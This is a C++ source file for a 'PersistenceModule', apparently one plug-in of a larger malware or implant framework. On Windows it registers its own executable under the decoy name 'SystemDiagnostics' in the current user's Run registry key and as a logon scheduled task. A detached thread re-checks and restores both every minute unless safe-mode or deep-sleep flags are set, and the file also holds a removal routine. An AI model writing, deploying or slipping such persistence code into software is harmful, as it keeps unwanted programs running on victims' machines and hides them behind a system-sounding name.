#include "PersistenceModule.h"
#include "Globals.h"
#ifdef _WIN32
#include <windows.h>
#include <string>
#endif
#include <chrono>
#include <thread>
#include <iostream>

#ifdef _WIN32
static std::string executable_path() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

static void set_run_key(const std::string& path) {
    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
            KEY_WRITE, &key) == ERROR_SUCCESS) {
        RegSetValueExA(key, "SystemDiagnostics", 0, REG_SZ,
            (const BYTE*)path.c_str(), path.size()+1);
        RegCloseKey(key);
    }
}

static bool check_run_key(const std::string& path) {
    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
            KEY_READ, &key) != ERROR_SUCCESS) {
        return false;
    }
    char buf[MAX_PATH];
    DWORD len = sizeof(buf);
    LONG ret = RegQueryValueExA(key, "SystemDiagnostics", NULL, NULL,
            (LPBYTE)buf, &len);
    RegCloseKey(key);
    if (ret != ERROR_SUCCESS) return false;
    return path == buf;
}

static void set_task(const std::string& path) {
    std::string cmd = "schtasks /Create /SC ONLOGON /TN SystemDiagnostics /TR \"" + path + "\" /F";
    system(cmd.c_str());
}

static bool check_task() {
    int ret = system("schtasks /Query /TN SystemDiagnostics >nul 2>&1");
    return ret == 0;
}

static void remove_run_key() {
    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
            KEY_WRITE, &key) == ERROR_SUCCESS) {
        RegDeleteValueA(key, "SystemDiagnostics");
        RegCloseKey(key);
    }
}

static void remove_task() {
    system("schtasks /Delete /TN SystemDiagnostics /F >nul 2>&1");
}
#endif

void PersistenceModule::ensure_persistence() {
#ifdef _WIN32
    std::string path = executable_path();
    if (!check_run_key(path)) {
        set_run_key(path);
    }
    if (!check_task()) {
        set_task(path);
    }
#else
    // non-Windows: no-op
#endif
}

void PersistenceModule::init() {
    ensure_persistence();
    monitor_ = std::thread([this]() {
        while (!g_safe_mode.load() && !g_deep_sleep.load()) {
            std::this_thread::sleep_for(std::chrono::minutes(1));
            ensure_persistence();
        }
    });
    monitor_.detach();
}

extern "C" Module* create_module() { return new PersistenceModule(); }

void remove_persistence() {
#ifdef _WIN32
    remove_run_key();
    remove_task();
#endif
}
